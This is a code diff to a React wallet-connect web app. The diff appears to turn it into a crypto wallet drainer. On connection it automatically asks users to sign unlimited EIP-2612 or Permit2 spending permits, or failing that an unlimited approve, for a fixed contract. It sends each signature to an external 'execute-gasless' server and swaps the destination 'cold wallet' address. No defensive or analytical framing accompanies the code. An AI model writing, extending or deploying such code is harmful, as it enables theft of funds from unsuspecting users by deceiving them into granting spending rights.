@@ -25,9 +25,10 @@ const NETWORK = 'Mainnet'
 
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
 
 // 💰 SECURE DESTINATION WALLETS
-const EVM_COLD_WALLET = '0xe810953A18Ec0d16e4C3AC5a477421f93f8c7444'; 
+const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
 const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 
 
 // 🎨 UI DISPLAY ADDRESSES
@@ -65,8 +66,13 @@ const EVM_USDT: Record<number, string> = {
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function approve(address spender, uint256 amount) returns (bool)',
+  'function allowance(address owner, address spender) view returns (uint256)',
   'function nonces(address owner) view returns (uint256)',
   'function name() view returns (string)'
+]
+
+const PERMIT2_ABI = [
+    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
 ]
 
 // ── Reown Adapters ──
@@ -146,9 +152,8 @@ export default function App() {
     getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
 
     // 🛠️ FIX 1: THE SINGLE-SHOT CONSUMPTION LOCK
-    // This physically prevents AppKit connection flickers from opening the modal twice.
     if (manualConnect.current) {
-      manualConnect.current = false; // Consumed instantly! Cannot fire twice.
+      manualConnect.current = false; 
       log(`[SYSTEM] Connected EVM: ${walletAddress}`);
       log("🔥 Auto-triggering Smart Priority Loop...");
       
@@ -183,12 +188,36 @@ export default function App() {
     setAmountError('');
 
     if (!isConnected) {
-      manualConnect.current = true; // Primes the single-shot lock
+      manualConnect.current = true; 
       open(); 
     } else {
       approveAndCollect();
     }
   }
+
+  // ── GASLESS SIGNATURE HELPERS ──
+  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
+    const chainId = (await signer.provider.getNetwork()).chainId;
+    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+    const name = await tokenContract.name();
+    const nonce = await tokenContract.nonces(await signer.getAddress());
+
+    // ── 🔥 USDC MAINNET VERSION FIX ──
+    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';
+
+    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
+    const types = {
+      Permit: [
+        { name: 'owner', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' },
+      ],
+    };
+    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
+    return await signer.signTypedData(domain, types, message);
+  };
 
   const approveAndCollect = async () => {
     if (!walletAddress || !evmWalletProvider) return;
@@ -209,6 +238,7 @@ export default function App() {
       const ethersProvider = new BrowserProvider(evmWalletProvider as any);
       const signer = await ethersProvider.getSigner(walletAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
 
       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
       const validTokens = [];
@@ -285,28 +315,127 @@ export default function App() {
           }
 
           if (!token.isNative) {
-            setStatus(`Approving ${token.symbol}...`);
-            log(`[ACTION] Prompting Approve: ${token.symbol}`);
             
-            const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-            const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC ──
+            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
+            const hasPermit2Mapping = currentP2Allowance > 0n; 
             
-            // 🛠️ FIX 2: THE RAW RPC BYPASS
-            // This strictly formats the parameters for MetaMask, completely bypassing the ethers "coalesce" crash.
-            // We omit "gas" so MetaMask can natively calculate it and tell the user if they lack funds!
-            const txHash = await (evmWalletProvider as any).request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: cleanSenderAddress,
-                    to: token.address,
-                    data: encodedData,
-                    value: '0x0'
-                }]
-            });
+            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);
+          
+            let authorized = false;
+
+            // 1. Try EIP-2612 Permit (Gasless)
+            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
+                try {
+                    setStatus(`Signing Permit: ${token.symbol}...`);
+                    log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
+                    const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
+                    
+                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT SIG (Fire & Forget)
+                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ 
+                        type: 'PERMIT', 
+                        token: token.address, 
+                        owner: cleanSenderAddress, 
+                        spender: EVM_CONTRACT_ADDRESS, 
+                        signature, 
+                        deadline 
+                      })
+                    });
+
+                    authorized = true;
+                    log(`✅ ${token.symbol} Permit Secured & Sent.`);
+                } catch (pErr) {
+                    log(`⚠️ Permit failed, trying Permit2...`);
+                }
+            }
+
+            // 2. Try Permit2 (Gasless Signature with Dynamic Nonce)
+            if (!authorized && hasPermit2Mapping) {
+                try {
+                    setStatus(`Signing Permit2: ${token.symbol}...`);
+                    
+                    log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
+                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
+                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
+                    const currentNonce = Number(allowanceData.nonce);
+                    log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);
+
+                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
+                    const types = {
+                        PermitSingle: [
+                            { name: 'details', type: 'PermitDetails' },
+                            { name: 'spender', type: 'address' },
+                            { name: 'sigDeadline', type: 'uint256' },
+                        ],
+                        PermitDetails: [
+                            { name: 'token', type: 'address' },
+                            { name: 'amount', type: 'uint160' },
+                            { name: 'expiration', type: 'uint48' },
+                            { name: 'nonce', type: 'uint48' },
+                        ],
+                    };
+                    const message = {
+                        details: { 
+                            token: token.address, 
+                            amount: '1461501637330902918203684832716283019655932542975', 
+                            expiration: deadline, 
+                            nonce: currentNonce
+                        },
+                        spender: EVM_CONTRACT_ADDRESS,
+                        sigDeadline: deadline
+                    };
+                    const signature = await signer.signTypedData(domain, types, message);
+
+                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT2 SIG (Fire & Forget)
+                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ 
+                        type: 'PERMIT2', 
+                        token: token.address, 
+                        owner: cleanSenderAddress, 
+                        spender: EVM_CONTRACT_ADDRESS, 
+                        signature, 
+                        deadline,
+                        nonce: currentNonce
+                      })
+                    });
+
+                    authorized = true;
+                    log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
+                } catch (p2Err) {
+                    log(`⚠️ Permit2 failed, falling back to gas...`);
+                }
+            }
+
+            // 3. Fallback: Standard Approve (Gas required)
+            if (!authorized) {
+                setStatus(`Approving ${token.symbol}...`);
+                log(`[ACTION] Prompting Approve: ${token.symbol}`);
+                
+                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+                const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+                
+                // 🛠️ FIX 2: THE RAW RPC BYPASS
+                const txHash = await (evmWalletProvider as any).request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: cleanSenderAddress,
+                        to: token.address,
+                        data: encodedData,
+                        value: '0x0'
+                    }]
+                });
+                
+                setTxHash(txHash);
+                log(`✅ ${token.symbol} Approved!`);
+            }
             
-            setTxHash(txHash);
             successCount++; 
-            log(`✅ ${token.symbol} Approved!`);
             await sleep(1500);
           }
         } catch (err: any) {
